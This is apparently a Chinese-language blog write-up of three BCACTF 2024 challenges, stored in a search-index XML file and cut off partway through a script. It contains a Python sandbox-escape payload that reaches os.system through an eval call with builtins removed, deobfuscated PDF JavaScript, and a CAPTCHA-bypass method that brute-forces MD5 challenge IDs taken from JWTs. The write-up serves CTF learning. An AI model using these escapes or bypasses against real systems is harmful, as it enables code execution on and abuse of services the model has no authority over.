<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>BCACTF</title>
    <url>/2024/06/10/BCACTF/</url>
    <content><![CDATA[<h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>国外的赛题还是挺有趣的，更偏脑洞一些。正值期末周，简单写两题当作娱乐放松了~。</p>
<h1 id="MathJail-misc"><a href="#MathJail-misc" class="headerlink" title="MathJail - misc"></a>MathJail - misc</h1><h2 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h2><p>Just a fun python calculator! Good for math class.</p>
<h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><ol>
<li>查看附件，如下。<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Welcome to your friendly python calculator!&quot;</span>)<br>equation = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;Enter your equation below and I will give you the answer:\n&quot;</span>)<br><span class="hljs-keyword">while</span> equation!=<span class="hljs-string">&quot;e&quot;</span>:<br>    answer = <span class="hljs-built_in">eval</span>(equation, &#123;<span class="hljs-string">&quot;__builtins__&quot;</span>:&#123;&#125;&#125;,&#123;&#125;)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Here is your answer: <span class="hljs-subst">&#123;answer&#125;</span>&quot;</span>)<br>    equation = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;Enter your next equation below (type &#x27;e&#x27; to exit):\n&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Goodbye!&quot;</span>)<br></code></pre></td></tr></table></figure></li>
<li>考点为删除了<code>__builtins__</code>的pyjail。参考 <a href="https://xz.aliyun.com/t/12647?time__1311=mqmhDvqIrrGNDQtiQGkI5YxWuFxjoOTD#toc-22">https://xz.aliyun.com/t/12647?time__1311=mqmhDvqIrrGNDQtiQGkI5YxWuFxjoOTD#toc-22</a> ，使用继承链条来绕过。</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/桌面]<br>└─$ nc challs.bcactf.com 31289<br><br>Welcome to your friendly python calculator!<br>Enter your equation below and I will give you the answer:<br>[ x.__init__.__globals__ <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="hljs-keyword">if</span> x.__name__==<span class="hljs-string">&quot;_wrap_close&quot;</span>][0][<span class="hljs-string">&quot;system&quot;</span>](<span class="hljs-string">&quot;ls&quot;</span>)<br>flag.txt<br>pycalculator.py<br>ynetd<br>ynetd.c<br>Here is your answer: 0<br>Enter your next equation below (<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;e&#x27;</span> to <span class="hljs-built_in">exit</span>):<br>[ x.__init__.__globals__ <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="hljs-keyword">if</span> x.__name__==<span class="hljs-string">&quot;_wrap_close&quot;</span>][0][<span class="hljs-string">&quot;system&quot;</span>](<span class="hljs-string">&quot;cat flag.txt&quot;</span>)<br>bcactf&#123;math_is_so_difficult_right?8943yfg09whgh3r89ghwerp&#125;Here is your answer: 0<br></code></pre></td></tr></table></figure>

<h1 id="magic-foren"><a href="#magic-foren" class="headerlink" title="magic - foren"></a>magic - foren</h1><h2 id="描述-1"><a href="#描述-1" class="headerlink" title="描述"></a>描述</h2><p>I found this piece of paper on the floor. I was going to throw it away, but it somehow screamed at me while I was holding it?!</p>
<p>hints: the pdf should be interactive; if not, try changing your pdf viewer</p>
<h2 id="附件"><a href="#附件" class="headerlink" title="附件"></a>附件</h2><p><a href="https://arcs-s3-repo.nyc3.cdn.digitaloceanspaces.com/magic/magic.pdf">https://arcs-s3-repo.nyc3.cdn.digitaloceanspaces.com/magic/magic.pdf</a></p>
<h2 id="解题-1"><a href="#解题-1" class="headerlink" title="解题"></a>解题</h2><ol>
<li>打开<code>magic.pdf</code>，发现可交互，推测内嵌了JavaScript脚本。</li>
<li>使用<code>Acrobat pdf reader</code>打开，提取出一串混淆过的JavaScript代码。</li>
</ol>
<figure class="highlight javascript"><table><tr><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> _thereisdjs=<span class="hljs-literal">true</span>;<br>    (<span class="hljs-keyword">function</span>(<span class="hljs-params">_0x18b13a,_0x4d582d</span>)&#123;<span class="hljs-keyword">var</span> _0x3da883=_0x4113,_0x1d0353=<span class="hljs-title function_">_0x18b13a</span>();<span class="hljs-keyword">while</span>(!![])&#123;<span class="hljs-keyword">try</span>&#123;<span class="hljs-keyword">var</span> _0x10c45c=<span class="hljs-built_in">parseInt</span>(<span class="hljs-title function_">_0x3da883</span>(<span class="hljs-number">0x1be</span>))/<span class="hljs-number">0x1</span>*(-<span class="hljs-built_in">parseInt</span>(<span class="hljs-title function_">_0x3da883</span>(<span class="hljs-number">0x1cc</span>))/<span class="hljs-number">0x2</span>)+<span class="hljs-built_in">parseInt</span>(<span class="hljs-title function_">_0x3da883</span>(<span class="hljs-number">0x1c2</span>))/<span class="hljs-number">0x3</span>+<span class="hljs-built_in">parseInt</span>(<span class="hljs-title function_">_0x3da883</span>(<span class="hljs-number">0x1c6</span>))/<span class="hljs-number">0x4</span>*(<span class="hljs-built_in">parseInt</span>(<span class="hljs-title function_">_0x3da883</span>(<span class="hljs-number">0x1c7</span>))/<span class="hljs-number">0x5</span>)+-<span class="hljs-built_in">parseInt</span>(<span class="hljs-title function_">_0x3da883</span>(<span class="hljs-number">0x1cb</span>))/<span class="hljs-number">0x6</span>*(<span class="hljs-built_in">parseInt</span>(<span class="hljs-title function_">_0x3da883</span>(<span class="hljs-number">0x1c1</span>))/<span class="hljs-number">0x7</span>)+-<span class="hljs-built_in">parseInt</span>(<span class="hljs-title function_">_0x3da883</span>(<span class="hljs-number">0x1ca</span>))/<span class="hljs-number">0x8</span>+<span class="hljs-built_in">parseInt</span>(<span class="hljs-title function_">_0x3da883</span>(<span class="hljs-number">0x1c0</span>))/<span class="hljs-number">0x9</span>+<span class="hljs-built_in">parseInt</span>(<span class="hljs-title function_">_0x3da883</span>(<span class="hljs-number">0x1c4</span>))/<span class="hljs-number">0xa</span>*(<span class="hljs-built_in">parseInt</span>(<span class="hljs-title function_">_0x3da883</span>(<span class="hljs-number">0x1bf</span>))/<span class="hljs-number">0xb</span>);<span class="hljs-keyword">if</span>(_0x10c45c===_0x4d582d)<span class="hljs-keyword">break</span>;<span class="hljs-keyword">else</span> _0x1d0353[<span class="hljs-string">&#x27;push&#x27;</span>](_0x1d0353[<span class="hljs-string">&#x27;shift&#x27;</span>]());&#125;<span class="hljs-keyword">catch</span>(_0x53c9c0)&#123;_0x1d0353[<span class="hljs-string">&#x27;push&#x27;</span>](_0x1d0353[<span class="hljs-string">&#x27;shift&#x27;</span>]());&#125;&#125;&#125;(_0x43c8,<span class="hljs-number">0xe20be</span>));<span class="hljs-keyword">function</span> <span class="hljs-title function_">_0x4113</span>(<span class="hljs-params">_0x44cfd2,_0x23b14b</span>)&#123;<span class="hljs-keyword">var</span> _0x43c873=<span class="hljs-title function_">_0x43c8</span>();<span class="hljs-keyword">return</span> _0x4113=<span class="hljs-keyword">function</span>(<span class="hljs-params">_0x4113e1,_0x43c2ed</span>)&#123;_0x4113e1=_0x4113e1-<span class="hljs-number">0x1bd</span>;<span class="hljs-keyword">var</span> _0x2522f0=_0x43c873[_0x4113e1];<span class="hljs-keyword">return</span> _0x2522f0;&#125;,<span class="hljs-title function_">_0x4113</span>(_0x44cfd2,_0x23b14b);&#125;<span class="hljs-keyword">function</span> <span class="hljs-title function_">_0x43c8</span>(<span class="hljs-params"></span>)&#123;<span class="hljs-keyword">var</span> _0x1355d8=[<span class="hljs-string">&#x27;getField&#x27;</span>,<span class="hljs-string">&#x27;charCodeAt&#x27;</span>,<span class="hljs-string">&#x27;100554TvjbzQ&#x27;</span>,<span class="hljs-string">&#x27;11jHxsKn&#x27;</span>,<span class="hljs-string">&#x27;7564617EnopjV&#x27;</span>,<span class="hljs-string">&#x27;2219BJkXWe&#x27;</span>,<span class="hljs-string">&#x27;3372363teHOVr&#x27;</span>,<span class="hljs-string">&#x27;alert&#x27;</span>,<span class="hljs-string">&#x27;5165870pcLTuS&#x27;</span>,<span class="hljs-string">&#x27;producer&#x27;</span>,<span class="hljs-string">&#x27;32KYViix&#x27;</span>,<span class="hljs-string">&#x27;925835vZTXso&#x27;</span>,<span class="hljs-string">&#x27;Flag is incorrect!&#x27;</span>,<span class="hljs-string">&#x27;length&#x27;</span>,<span class="hljs-string">&#x27;8132288HsoZUP&#x27;</span>,<span class="hljs-string">&#x27;13494jFFdda&#x27;</span>,<span class="hljs-string">&#x27;26rtwUNT&#x27;</span>];_0x43c8=<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<span class="hljs-keyword">return</span> _0x1355d8;&#125;;<span class="hljs-keyword">return</span> <span class="hljs-title function_">_0x43c8</span>();&#125;<span class="hljs-keyword">function</span> <span class="hljs-title function_">update</span>(<span class="hljs-params"></span>)&#123;<span class="hljs-keyword">var</span> _0x3d0e72=_0x4113,_0x2923fd=<span class="hljs-variable language_">this</span>[<span class="hljs-title function_">_0x3d0e72</span>(<span class="hljs-number">0x1cd</span>)](<span class="hljs-string">&#x27;A&#x27;</span>)[<span class="hljs-string">&#x27;value&#x27;</span>],_0x12e8ec=[];<span class="hljs-keyword">for</span>(<span class="hljs-keyword">var</span> _0x28002d=<span class="hljs-number">0x0</span>;_0x28002d&lt;_0x2923fd[<span class="hljs-title function_">_0x3d0e72</span>(<span class="hljs-number">0x1c9</span>)];_0x28002d++)&#123;_0x12e8ec[<span class="hljs-string">&#x27;push&#x27;</span>](_0x2923fd[<span class="hljs-title function_">_0x3d0e72</span>(<span class="hljs-number">0x1bd</span>)](_0x28002d)^<span class="hljs-built_in">parseInt</span>(info[<span class="hljs-title function_">_0x3d0e72</span>(<span class="hljs-number">0x1c5</span>)])%(<span class="hljs-number">0x75</span>+_0x28002d));&#125;k=[<span class="hljs-number">0x46</span>,<span class="hljs-number">0x2d</span>,<span class="hljs-number">0x62</span>,<span class="hljs-number">0x11</span>,<span class="hljs-number">0x6b</span>,<span class="hljs-number">0x4c</span>,<span class="hljs-number">0x72</span>,<span class="hljs-number">0x5f</span>,<span class="hljs-number">0x76</span>,<span class="hljs-number">0x38</span>,<span class="hljs-number">0x19</span>,<span class="hljs-number">0x28</span>,<span class="hljs-number">0x5f</span>,<span class="hljs-number">0x31</span>,<span class="hljs-number">0x36</span>,<span class="hljs-number">0x63</span>,<span class="hljs-number">0xf7</span>,<span class="hljs-number">0xb1</span>,<span class="hljs-number">0x69</span>,<span class="hljs-number">0x2a</span>,<span class="hljs-number">0x18</span>,<span class="hljs-number">0x5e</span>,<span class="hljs-number">0x36</span>,<span class="hljs-number">0x1</span>,<span class="hljs-number">0x37</span>,<span class="hljs-number">0x3a</span>,<span class="hljs-number">0x1c</span>,<span class="hljs-number">0x5</span>,<span class="hljs-number">0x11</span>,<span class="hljs-number">0x56</span>,<span class="hljs-number">0xe5</span>,<span class="hljs-number">0x7b</span>,<span class="hljs-number">0x64</span>,<span class="hljs-number">0x2c</span>,<span class="hljs-number">0x11</span>,<span class="hljs-number">0x14</span>,<span class="hljs-number">0x53</span>,<span class="hljs-number">0x5a</span>,<span class="hljs-number">0x35</span>,<span class="hljs-number">0x17</span>,<span class="hljs-number">0x41</span>,<span class="hljs-number">0x62</span>,<span class="hljs-number">0x3</span>];<span class="hljs-keyword">if</span>(_0x12e8ec[<span class="hljs-string">&#x27;length&#x27;</span>]!=k[<span class="hljs-title function_">_0x3d0e72</span>(<span class="hljs-number">0x1c9</span>)])&#123;app[<span class="hljs-title function_">_0x3d0e72</span>(<span class="hljs-number">0x1c3</span>)](<span class="hljs-title function_">_0x3d0e72</span>(<span class="hljs-number">0x1c8</span>));<span class="hljs-keyword">return</span>;&#125;<span class="hljs-keyword">for</span>(<span class="hljs-keyword">var</span> _0x28002d=<span class="hljs-number">0x0</span>;_0x28002d&lt;k[<span class="hljs-title function_">_0x3d0e72</span>(<span class="hljs-number">0x1c9</span>)];_0x28002d++)&#123;<span class="hljs-keyword">if</span>(_0x12e8ec[_0x28002d]!=k[_0x28002d])&#123;app[<span class="hljs-title function_">_0x3d0e72</span>(<span class="hljs-number">0x1c3</span>)](<span class="hljs-title function_">_0x3d0e72</span>(<span class="hljs-number">0x1c8</span>));<span class="hljs-keyword">return</span>;&#125;&#125;app[<span class="hljs-title function_">_0x3d0e72</span>(<span class="hljs-number">0x1c3</span>)](<span class="hljs-string">&#x27;Flag is correct!&#x27;</span>);&#125;<br></code></pre></td></tr></table></figure>
<ol start="3">
<li><p>发现代码分为两部分，一部分为混淆加密字段的解密，另一部分<code>update()</code>为flag验证函数。</p>
</li>
<li><p>通过本地调试 + 调用解密函数可以大致还原<code>update()</code>的面貌。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">update</span>(<span class="hljs-params"></span>) &#123;<br>    input = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">getField</span>(<span class="hljs-string">&#x27;A&#x27;</span>)[<span class="hljs-string">&#x27;value&#x27;</span>], ans = [];<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; input.<span class="hljs-title function_">length</span>(); i++) &#123;<br>        ans[<span class="hljs-string">&#x27;push&#x27;</span>](input.<span class="hljs-title function_">charCodeAt</span>(i) ^ <span class="hljs-built_in">parseInt</span>(info[<span class="hljs-string">&#x27;producer&#x27;</span>]) % (<span class="hljs-number">117</span> + i));<br>    &#125;<br>    k = [<br>        <span class="hljs-number">70</span>, <span class="hljs-number">45</span>, <span class="hljs-number">98</span>, <span class="hljs-number">17</span>, <span class="hljs-number">107</span>, <span class="hljs-number">76</span>, <span class="hljs-number">114</span>, <span class="hljs-number">95</span>, <span class="hljs-number">118</span>, <span class="hljs-number">56</span>, <span class="hljs-number">25</span>, <span class="hljs-number">40</span>, <span class="hljs-number">95</span>, <span class="hljs-number">49</span>, <span class="hljs-number">54</span>, <span class="hljs-number">99</span>, <span class="hljs-number">247</span>, <span class="hljs-number">177</span>, <span class="hljs-number">105</span>, <span class="hljs-number">42</span>, <span class="hljs-number">24</span>, <span class="hljs-number">94</span>, <span class="hljs-number">54</span>, <span class="hljs-number">1</span>, <span class="hljs-number">55</span>, <span class="hljs-number">58</span>, <span class="hljs-number">28</span>, <span class="hljs-number">5</span>, <span class="hljs-number">17</span>, <span class="hljs-number">86</span>, <span class="hljs-number">229</span>, <span class="hljs-number">123</span>, <span class="hljs-number">100</span>, <span class="hljs-number">44</span>, <span class="hljs-number">17</span>, <span class="hljs-number">20</span>, <span class="hljs-number">83</span>, <span class="hljs-number">90</span>, <span class="hljs-number">53</span>, <span class="hljs-number">23</span>, <span class="hljs-number">65</span>, <span class="hljs-number">98</span>, <span class="hljs-number">3</span><br>    ];<br>    <span class="hljs-keyword">if</span> (ans[<span class="hljs-string">&#x27;length&#x27;</span>] != k.<span class="hljs-title function_">length</span>()) &#123;<br>        app.<span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;Flag is incorrect!&#x27;</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; k.<span class="hljs-title function_">length</span>(); i++) &#123;<br>        <span class="hljs-keyword">if</span> (ans[i] != k[i]) &#123;<br>            app.<span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;Flag is incorrect!&#x27;</span>);<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>    &#125;<br>    app.<span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;Flag is correct!&#x27;</span>);<br>&#125;<br></code></pre></td></tr></table></figure></li>
<li><p>根据解密后的代码，已经知道了大概的逻辑，其中还有一个<code>parseInt(info[&#39;producer&#39;])</code>待解决。用<code>010 hexEditor</code> 打开这个文件。搜索<code>producer</code>可以找到这样一串明文信息。</p>
<figure class="highlight text"><table><tr><td class="code"><pre><code class="hljs text">42 0 obj<br>&lt;&lt;<br>/Author()/Title()/Subject()/Creator()/Producer(\376\377\0002\0008\0003\0005\0004\0008\0008\0009\0003\0002\0007\0004)/Keywords()<br>/CreationDate (D:20240528134825-04&#x27;00&#x27;)<br>/ModDate (D:20240528134825-04&#x27;00&#x27;)<br>/Trapped /False<br>/PTEX.Fullbanner (This is pdfTeX, Version 3.141592653-2.6-1.40.26 (TeX Live 2024/Arch Linux) kpathsea version 6.4.0)<br>&gt;&gt;<br>endobj<br></code></pre></td></tr></table></figure>
<p>询问gpt得知<code>Producer</code>字段的内容是<code>283548893274</code>。故<code>update()</code>完整代码如下：</p>
</li>
</ol>
<figure class="highlight javascript"><table><tr><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">update</span>(<span class="hljs-params"></span>) &#123;<br>    input = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">getField</span>(<span class="hljs-string">&#x27;A&#x27;</span>).<span class="hljs-property">value</span>, ans = [];<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; input.<span class="hljs-title function_">length</span>(); i++) &#123;<br>        ans.<span class="hljs-title function_">push</span>(input.<span class="hljs-title function_">charCodeAt</span>(i) ^ <span class="hljs-number">283548893274</span> % (<span class="hljs-number">117</span> + i));<br>    &#125;<br>    k = [<br>        <span class="hljs-number">70</span>, <span class="hljs-number">45</span>, <span class="hljs-number">98</span>, <span class="hljs-number">17</span>, <span class="hljs-number">107</span>, <span class="hljs-number">76</span>, <span class="hljs-number">114</span>, <span class="hljs-number">95</span>, <span class="hljs-number">118</span>, <span class="hljs-number">56</span>, <span class="hljs-number">25</span>, <span class="hljs-number">40</span>, <span class="hljs-number">95</span>, <span class="hljs-number">49</span>, <span class="hljs-number">54</span>, <span class="hljs-number">99</span>, <span class="hljs-number">247</span>, <span class="hljs-number">177</span>, <span class="hljs-number">105</span>, <span class="hljs-number">42</span>, <span class="hljs-number">24</span>, <span class="hljs-number">94</span>, <span class="hljs-number">54</span>, <span class="hljs-number">1</span>, <span class="hljs-number">55</span>, <span class="hljs-number">58</span>, <span class="hljs-number">28</span>, <span class="hljs-number">5</span>, <span class="hljs-number">17</span>, <span class="hljs-number">86</span>, <span class="hljs-number">229</span>, <span class="hljs-number">123</span>, <span class="hljs-number">100</span>, <span class="hljs-number">44</span>, <span class="hljs-number">17</span>, <span class="hljs-number">20</span>, <span class="hljs-number">83</span>, <span class="hljs-number">90</span>, <span class="hljs-number">53</span>, <span class="hljs-number">23</span>, <span class="hljs-number">65</span>, <span class="hljs-number">98</span>, <span class="hljs-number">3</span><br>    ];<br>    <span class="hljs-keyword">if</span> (ans.<span class="hljs-title function_">length</span>() != k.<span class="hljs-title function_">length</span>()) &#123;<br>        app.<span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;Flag is incorrect!&#x27;</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; k.<span class="hljs-title function_">length</span>(); i++) &#123;<br>        <span class="hljs-keyword">if</span> (ans[i] != k[i]) &#123;<br>            app.<span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;Flag is incorrect!&#x27;</span>);<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>    &#125;<br>    app.<span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;Flag is correct!&#x27;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
<ol start="6">
<li>使用<code>k</code>mod<code>283548893274 % (117 + i)</code>得到原始flag<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">k = [<br>    <span class="hljs-number">70</span>, <span class="hljs-number">45</span>, <span class="hljs-number">98</span>, <span class="hljs-number">17</span>, <span class="hljs-number">107</span>, <span class="hljs-number">76</span>, <span class="hljs-number">114</span>, <span class="hljs-number">95</span>, <span class="hljs-number">118</span>, <span class="hljs-number">56</span>, <span class="hljs-number">25</span>, <span class="hljs-number">40</span>, <span class="hljs-number">95</span>, <span class="hljs-number">49</span>, <span class="hljs-number">54</span>, <span class="hljs-number">99</span>,<br>    <span class="hljs-number">247</span>, <span class="hljs-number">177</span>, <span class="hljs-number">105</span>, <span class="hljs-number">42</span>, <span class="hljs-number">24</span>, <span class="hljs-number">94</span>, <span class="hljs-number">54</span>, <span class="hljs-number">1</span>, <span class="hljs-number">55</span>, <span class="hljs-number">58</span>, <span class="hljs-number">28</span>, <span class="hljs-number">5</span>, <span class="hljs-number">17</span>, <span class="hljs-number">86</span>, <span class="hljs-number">229</span>, <span class="hljs-number">123</span>,<br>    <span class="hljs-number">100</span>, <span class="hljs-number">44</span>, <span class="hljs-number">17</span>, <span class="hljs-number">20</span>, <span class="hljs-number">83</span>, <span class="hljs-number">90</span>, <span class="hljs-number">53</span>, <span class="hljs-number">23</span>, <span class="hljs-number">65</span>, <span class="hljs-number">98</span>, <span class="hljs-number">3</span><br>]<br>flag = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(k)):<br>    char_code = k[i] ^ <span class="hljs-number">283548893274</span> % (<span class="hljs-number">117</span> + i)<br>    flag += <span class="hljs-built_in">str</span>(<span class="hljs-built_in">chr</span>(char_code))<br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure></li>
</ol>
<h1 id="Fogblaze"><a href="#Fogblaze" class="headerlink" title="Fogblaze"></a>Fogblaze</h1><h2 id="描述-2"><a href="#描述-2" class="headerlink" title="描述"></a>描述</h2><p>Can you bypass this website’s new stateless CAPTCHA system?</p>
<p>Hints: The challengeId for “SCLN” would be 1e8298221a767bb37c01eb0cc61d1775</p>
<h2 id="解题-2"><a href="#解题-2" class="headerlink" title="解题"></a>解题</h2><ol>
<li><p>进入网站后，发现需要验证码。</p>
<img src="/2024/06/10/BCACTF/1.png" class="">
</li>
<li><p>开启抓包，大写输入验证码后进入到一级目录。</p>
<img src="/2024/06/10/BCACTF/2.png" class="">
</li>
<li><p>抓包结果有两种类型的包。一种是初始化验证码。</p>
<figure class="highlight http"><table><tr><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/captcha</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>no-cache<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>15<br><span class="hljs-attribute">DNT</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>challs.bcactf.com:30311<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://challs.bcactf.com:30311<br><span class="hljs-attribute">Pragma</span><span class="hljs-punctuation">: </span>no-cache<br><span class="hljs-attribute">Proxy-Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://challs.bcactf.com:30311/captcha?destination=/<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0<br><span class="hljs-attribute">content-type</span><span class="hljs-punctuation">: </span>application/json<br><br><span class="language-json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;routeId&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;/&quot;</span><span class="hljs-punctuation">&#125;</span></span><br></code></pre></td></tr></table></figure></li>
</ol>
<p>返回的内容为<code>captchaToken - 验证码token</code>, <code>image - 验证码图片base64</code>, <code>solved - 已解出题数</code>, <code>total - 总共题数</code>, <code>done - 是否通关</code></p>
<figure class="highlight http"><table><tr><td class="code"><pre><code class="hljs http">&#123;<br>    &quot;captchaToken&quot;: &quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJjYXB0Y2hhSWQiOiI5YTYxN2M3Mi1iZjg4LTQ0OTAtODhiMi1jNzUxNTA2NDQ5MjEiLCJyb3V0ZUlkIjoiLyIsImNoYWxsZW5nZUlkIjoiODZjOWNmNGUzNWViMDlkZGJkMWI4OGFkNTI0YmMwMmYiLCJzb2x2ZWQiOjAsInRvdGFsIjoyLCJkb25lIjpmYWxzZSwiaWF0IjoxNzE4MDI4NTM5LCJleHAiOjE3MTgwMjg1OTl9.FNLAdC0D0ltnSnZWkwUSkyyA3oB0Hag6afygwAAOc30&quot;,<br>    &quot;image&quot;: &quot;&quot;data:image/png;base64,iVBORw0KGgoAAAAN....&quot;,<br>    &quot;solved&quot;: 0,<br>    &quot;total&quot;: 2,<br>    &quot;done&quot;: false<br>&#125;<br></code></pre></td></tr></table></figure>

<p>另一种是解题数据包，请求头与上一种相同，但payload为</p>
<figure class="highlight http"><table><tr><td class="code"><pre><code class="hljs http">&#123;&quot;captchaToken&quot;:&quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJjYXB0Y2hhSWQiOiI5YTYxN2M3Mi1iZjg4LTQ0OTAtODhiMi1jNzUxNTA2NDQ5MjEiLCJyb3V0ZUlkIjoiLyIsImNoYWxsZW5nZUlkIjoiODZjOWNmNGUzNWViMDlkZGJkMWI4OGFkNTI0YmMwMmYiLCJzb2x2ZWQiOjAsInRvdGFsIjoyLCJkb25lIjpmYWxzZSwiaWF0IjoxNzE4MDI4NTM5LCJleHAiOjE3MTgwMjg1OTl9.FNLAdC0D0ltnSnZWkwUSkyyA3oB0Hag6afygwAAOc30&quot;,&quot;word&quot;:&quot;BEGI&quot;&#125;<br></code></pre></td></tr></table></figure>

<p>需要<code>captchaToken</code>和<code>word</code>。</p>
<ol start="4">
<li><p>进入到一级目录后，尝试访问<code>The Flag</code>，发现还是需要验证码，而且数量高达75个。</p>
<img src="/2024/06/10/BCACTF/3.png" class="">
<p><del>先试试人工打码，结果出现了时间限制。</del><br><del>尝试使用ddddocr，但是识别率堪忧，而且只要中间出错，就要重新来。</del><br>这时候回头看了眼提示，发现<code>1e8298221a767bb37c01eb0cc61d1775</code>是<code>SCLN</code>的md5值，而且在token的第二部分，是题目相关信息的base64，其中就包含了<code>challengeId</code>。</p>
<img src="/2024/06/10/BCACTF/4.png" class="">
</li>
<li><p>接下来生成爆破字典以及写写自动化脚本。</p>
<figure class="highlight py"><table><tr><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> hashlib<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./hashes.txt&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">26</span>):<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">26</span>):<br>            <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">26</span>):<br>                <span class="hljs-keyword">for</span> l <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">26</span>):<br>                    s = <span class="hljs-built_in">chr</span>(i + <span class="hljs-number">65</span>) + <span class="hljs-built_in">chr</span>(j + <span class="hljs-number">65</span>) + <span class="hljs-built_in">chr</span>(k + <span class="hljs-number">65</span>) + <span class="hljs-built_in">chr</span>(l + <span class="hljs-number">65</span>)<br>                    f.write(s + <span class="hljs-string">&quot; &quot;</span> + hashlib.md5(s.encode()).hexdigest() + <span class="hljs-string">&quot;\n&quot;</span>)<br></code></pre></td></tr></table></figure></li>
</ol>
<figure class="highlight py"><table><tr><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> requests, json, base64, tqdm<br><br>url = <span class="hljs-string">&quot;http://challs.bcactf.com:30311/captcha&quot;</span><br>route = <span class="hljs-string">&quot;/flag&quot;</span><br><br><span class="hljs-comment"># 初始化，获取token</span><br>headers = &#123;<span class="hljs-string">&quot;content-type&quot;</span>: <span class="hljs-string">&quot;application/json&quot;</span>, <span class="hljs-string">&quot;Connection&quot;</span>: <span class="hljs-string">&quot;Keep-Alive&quot;</span>&#125;<br>session = requests.Session()<br>response = session.post(url, data=json.dumps(&#123;<span class="hljs-string">&quot;routeId&quot;</span>: route&#125;), headers=headers)<br>data = json.loads(response.text)<br>token = data[<span class="hljs-string">&quot;captchaToken&quot;</span>]<br>total = data[<span class="hljs-string">&quot;total&quot;</span>]<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">solve</span>(<span class="hljs-params">token, word</span>):<br>    payload = json.dumps(&#123;<span class="hljs-string">&quot;captchaToken&quot;</span>: token, <span class="hljs-string">&quot;word&quot;</span>: word&#125;)<br>    response = session.post(url, 